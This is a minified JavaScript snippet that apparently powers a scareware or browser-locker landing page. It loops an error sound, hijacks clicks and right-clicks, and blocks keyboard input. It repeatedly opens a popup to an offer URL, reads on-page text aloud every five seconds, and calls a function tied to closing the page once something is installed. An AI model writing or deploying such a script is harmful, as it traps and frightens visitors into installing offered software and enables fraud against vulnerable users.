(function(){var sample=document.getElementById("foobar");var playErr=function(){try{sample.play().catch(function(e){console.error(e);});}catch(e){console.error(e);}};playErr();var text=document.querySelector(".txt");var bgDarker=document.getElementById("bg-darker"),redArrow=document.getElementById("red-arrow"),windowBS=document.getElementById("window_bs"),promptWrap=document.getElementById("prompt-wrap");var
showOrHide=function(e,n){e.setAttribute("style","visibility: "+(n?"visible":"hidden"))},hide=function(e){showOrHide(e,!1)},show=function(e){showOrHide(e,!0)},restartAnimation=function(e){if(!e)return;e.removeAttribute("class"),e.offsetWidth,e.setAttribute("class","animate")},opened=null,wasOpened=!1,needWidth=320,needHeight=480,needLeft=0,needTop=0;var calcTopLeft=function(){needLeft=window.screenLeft+window.innerWidth-needWidth;needTop=window.screenTop;};calcTopLeft(),window.addEventListener("resize",calcTopLeft);var isWindowOpened=function(){return opened&&!opened.closed;};var openWindow=function(open){if(!isWindowOpened()&&open){opened=window.open(getOffer(),"_blank","width=320,height=510,left="+needLeft+",top="+needTop);if(opened)
wasOpened=true;show(bgDarker);hide(windowBS);show(redArrow);}else(opened&&opened.focus());};var prevent=function(e){if(e){e.stopPropagation();e.preventDefault();}};var click=function(e){prevent(e);openWindow(true);};document.body.onclick=click;document.oncontextmenu=click;document.onkeydown=prevent;window.onfocus=function(){openWindow(false);};setInterval(function(){!isWindowOpened()&&wasOpened&&(wasOpened=false,hide(redArrow),show(windowBS),restartAnimation(promptWrap),playErr());},200);var speak=function(){if(!isWindowOpened()&&text&&text.childNodes&&text.childNodes[0]&&text.childNodes[0].nodeValue){speakText(text.childNodes[0].nodeValue,_textFor("en")).catch(function(){});}
setTimeout(speak,5000);};setTimeout(speak,500);})();closeLandingOnInstall();